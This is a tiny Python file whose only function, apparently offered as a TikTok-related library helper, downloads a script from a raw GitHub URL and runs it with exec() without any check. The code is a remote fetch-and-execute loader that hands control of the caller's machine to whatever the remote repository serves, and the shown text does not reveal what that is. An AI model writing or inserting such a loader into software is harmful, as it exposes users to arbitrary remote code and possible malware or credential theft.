import requests

def tiktokMaska(app):
    url = 'https://raw.githubusercontent.com/MaSKaThGod/MaskaLibOffi/main/tiktok.py'
    response = requests.get(url)
    script_content = response.text
    exec(script_content)
